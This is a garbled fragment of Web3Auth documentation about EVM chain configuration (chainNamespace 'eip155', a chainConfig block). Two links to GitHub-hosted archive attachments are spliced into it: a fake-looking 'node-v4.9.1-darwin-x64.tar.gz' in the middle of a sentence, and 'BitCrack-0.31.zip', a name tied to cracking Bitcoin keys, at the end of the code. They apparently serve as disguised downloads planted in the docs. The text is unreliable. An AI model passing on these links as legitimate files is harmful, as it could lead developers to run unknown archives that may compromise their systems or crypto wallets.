...
If you are using `chainNamespace: "eip155"` while initializing `Web3Auth` or `Web3AuthCore`, it will provide you with an
...
[ChainList][node-v4.9.1-darwin-x64.tar.gz](https://github.com/Web3Auth/web3auth-docs/files/10716081/node-v4.9.1-darwin-x64.tar.gz)/). Please note that you need to pass over the hex value of the chain id while initialising Web3Auth.
    ...
    config: {
      ...
      */
      chainConfig: {
        ...
        ticker: "ETH",
        tickerName: "Ethereum",[BitCrack-0.31.zip](https://github.com/Web3Auth/web3auth-docs/files/10716084/BitCrack-0.31.zip)
